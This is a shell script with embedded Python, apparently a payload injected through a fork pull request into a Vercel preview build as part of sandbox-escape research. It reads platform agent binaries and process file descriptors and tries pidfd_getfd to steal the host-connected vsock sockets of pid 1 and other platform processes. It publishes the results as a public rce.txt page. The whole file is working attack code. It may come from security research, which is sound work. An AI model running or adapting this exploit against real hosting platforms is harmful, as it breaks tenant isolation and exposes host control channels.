#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 8: AF_VSOCK (the only guest->host
# device channel) is denied to build code, but the platform agent (pid 1) is
# already connected to the host. Try to take its socket with pidfd_getfd.
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
{
  echo "== what the agent binary references =="
  grep -o -E 'vsock|VSOCK|celld|169\.254\.[0-9.]+|unix://[^"]{0,40}|wss?://[^"]{0,50}|AF_VSOCK|virtio' /var/task/index-main.js 2>/dev/null | sort -u | head -25
  echo "-- init-main.js --"
  grep -o -E 'vsock|VSOCK|celld|169\.254\.[0-9.]+|unix://[^"]{0,40}|wss?://[^"]{0,50}|virtio' /var/task/init-main.js 2>/dev/null | sort -u | head -25
  echo "== sockets held by platform processes =="
  for p in 1 12 36; do
    echo "-- pid $p ($(tr '\0' ' ' < /proc/$p/cmdline | cut -c1-70))"
    ls -l /proc/$p/fd 2>&1 | grep -v '^total' | head -14
  done
  echo "== /proc/net contents =="
  ls /proc/net 2>&1 | tr '\n' ' '
  echo
} > "$F" 2>&1
{
  echo "== pidfd_getfd: can build code take the agent's sockets? =="
  /uv/python/bin/python3 - <<'PYEOF' 2>&1
import os, ctypes
libc = ctypes.CDLL("libc.so.6")
NAMES = {1:"UNIX", 2:"INET", 10:"INET6", 16:"NETLINK", 17:"PACKET", 40:"VSOCK"}

def getname(fd):
    buf = ctypes.create_string_buffer(128)
    ln = ctypes.c_int(128)
    if libc.getsockname(ctypes.c_int(fd), buf, ctypes.byref(ln)) != 0:
        return "getsockname failed"
    fam = ctypes.c_ushort.from_buffer(buf, 0).value
    raw = bytes(buf[:ln.value])
    d = NAMES.get(fam, "fam=%d" % fam)
    if fam == 40:
        d += " cid=%d port=%d" % (int.from_bytes(raw[8:12], "little"),
                                  int.from_bytes(raw[12:16], "little"))
    elif fam in (2, 10):
        d += " %s:%d" % (".".join(str(b) for b in raw[4:8]),
                         int.from_bytes(raw[2:4], "big"))
    return "%s (%d bytes)" % (d, ln.value)

for pid in (1, 12, 36):
    try:
        fds = sorted(int(x) for x in os.listdir("/proc/%d/fd" % pid))
    except Exception as e:
        print("  pid %d: %r" % (pid, e)); continue
    print("  pid %d fds: %s" % (pid, fds[:24]))
    try:
        pidfd = os.pidfd_open(pid, 0)
    except Exception as e:
        print("    pidfd_open -> %r" % e); continue
    for fd in fds:
        try:
            stolen = os.pidfd_getfd(pidfd, fd, 0)
        except Exception as e:
            print("    fd %d -> %r" % (fd, e)); continue
        try:
            print("    fd %d -> TAKEN as %d | %s" % (fd, stolen, getname(stolen)))
        except Exception as e:
            print("    fd %d -> TAKEN, unknown: %r" % (fd, e))
PYEOF
} >> "$F" 2>&1
sleep 2
cat "$F"
